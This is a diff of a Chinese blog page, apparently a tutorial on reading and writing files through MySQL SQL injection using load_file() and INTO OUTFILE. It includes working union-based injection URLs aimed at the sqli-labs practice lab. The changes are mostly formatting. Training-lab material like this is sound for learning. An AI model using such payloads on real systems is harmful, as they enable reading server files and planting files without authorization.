@@ -8,7 +8,7 @@
     <meta name="description" content="SQL注入文件读写及导出这里的load_file()和into outfile或into dumpfile函数都是Mysql数据库的内置函数。
 1、load_file():读取函数：
 以下代码实在数据库执行的源码进行文件读取：
-1selec">
+select">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -477,7 +477,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    750
+                    764
                 </div>
                 
 
@@ -494,6 +494,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -502,19 +505,19 @@
                 <h2 id="SQL注入文件读写及导出"><a href="#SQL注入文件读写及导出" class="headerlink" title="SQL注入文件读写及导出"></a>SQL注入文件读写及导出</h2><p>这里的load_file()和into outfile或into dumpfile函数都是Mysql数据库的内置函数。</p>
 <p>1、<strong>load_file():读取函数</strong>：</p>
 <p>以下代码实在数据库执行的源码进行文件读取：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);这里的D可以用小写d</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;D:&#x2F;1.txt&#39;);这里的D可以用小写d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里的d:/1.txt文件路径中的斜杠要用 / ,由于在sql语句中 \n是换行符，所以为了避免，这里的读取路径要使用 / ；另一种可以通过\进行转义出  \ 。</p>
 <p>执行如下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,load_file(&#x27;D:/1.txt&#x27;),3 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&#39;D:&#x2F;1.txt&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到已读取出1.txt文件的内容。</p>
 <p><img src="/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/image-20220201182045161.png" alt="image-20220201182045161"></p>
 <p>2、<strong>into outfile或into dumpfile:导出函数</strong>：</p>
 <p>源码执行语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;CTF1&#x27; into outfile &#x27;D:/2.txt&#x27;;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">select &#39;CTF1&#39; into outfile &#39;D:&#x2F;2.txt&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,&#x27;CTF1&#x27;  into outfile &#x27;D:/2.txt&#x27; --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;CTF1&#39;  into outfile &#39;D:&#x2F;2.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里的写入语句，要写入的东西和路径都需要加 ‘’ 。</p>
 <p>可以看到页面返回异常，但返回D盘查看文件，已将CTF1写入文件2.txt</p>
@@ -976,7 +979,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
